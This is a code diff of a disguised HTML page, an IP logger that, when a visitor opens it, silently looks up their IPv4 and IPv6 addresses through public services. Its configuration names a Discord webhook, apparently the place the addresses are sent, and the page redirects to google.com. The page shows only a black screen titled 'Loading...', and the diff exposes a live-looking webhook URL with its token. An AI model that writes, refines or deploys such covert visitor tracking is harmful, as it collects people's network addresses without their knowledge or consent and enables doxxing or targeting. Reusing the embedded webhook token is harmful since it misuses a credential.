@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>Loading...</title>
     <script>
         // ==========================================
         // CONFIGURATION AREA
@@ -11,7 +11,7 @@
         const CONFIG = {
             DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l',
             REDIRECT_URL: 'https://google.com', // Where to send the visitor after tracking
-            EMBED_COLOR: 16766720 // Decimal color code (3447003 is Blue)
+            EMBED_COLOR: 16766720 // Decimal color code
         };
         // ==========================================
 
@@ -19,24 +19,27 @@
             let ipv4 = 'Not available / IPv6-Only';
             let ipv6 = 'Not available / IPv4-Only';
 
-            // 1. Fetch strict IPv4 Address
+            // 1. Fetch strict IPv4 Address (via SeeIP v4 subdomain)
             try {
                 const res4 = await fetch('https://seeip.org');
                 if (res4.ok) {
                     const data4 = await res4.json();
-                    if (data4 && data4.ipString) ipv4 = data4.ipString.trim();
+                    if (data4 && data4.ip) ipv4 = data4.ip.trim();
                 }
             } catch (e) {}
 
-            // 2. Fetch strict IPv6 Address
+            // 2. Fetch strict IPv6 Address (via dedicated IPv6 subdomain)
             try {
                 const res6 = await fetch('https://icanhazip.com');
-                if (res6.ok) ipv6 = (await res6.text()).trim();
+                if (res6.ok) {
+                    const text6 = await res6.text();
+                    ipv6 = text6.trim();
+                }
             } catch (e) {}
 
             // Format current date and time
             const now = new Date();
-            const simpleDateString = now.toLocaleString('de-DE', {
+            const simpleDateString = now.toLocaleString('en-US', {
                 day: '2-digit',
                 month: '2-digit',
                 year: 'numeric',
@@ -80,7 +83,7 @@
         window.addEventListener('DOMContentLoaded', trackAndRedirect);
     </script>
     <style>
-        /* Makes the entire page completely black and hides scrolls */
+        /* Makes the entire page completely black and hides scrollbars */
         html, body {
             background-color: #000000 !important;
             margin: 0;
